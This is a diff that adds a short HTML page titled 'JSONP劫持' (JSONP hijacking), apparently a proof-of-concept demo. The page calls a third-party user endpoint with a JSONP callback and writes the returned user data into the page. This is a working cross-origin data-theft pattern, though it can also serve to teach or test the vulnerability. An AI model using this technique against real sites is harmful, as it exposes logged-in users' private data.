@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <title>JSONP劫持</title>
+</head>
+<body>
+<div id="text"></div>
+<script>
+    function JSONP(req) {
+        console.log(req)
+        document.querySelector('#text').innerHTML = req.retMsg
+    }
+</script>
+<script src="http://local-api.gaeamobile.net:8888/user?callback=JSONP"></script>
+</body>
+</html>
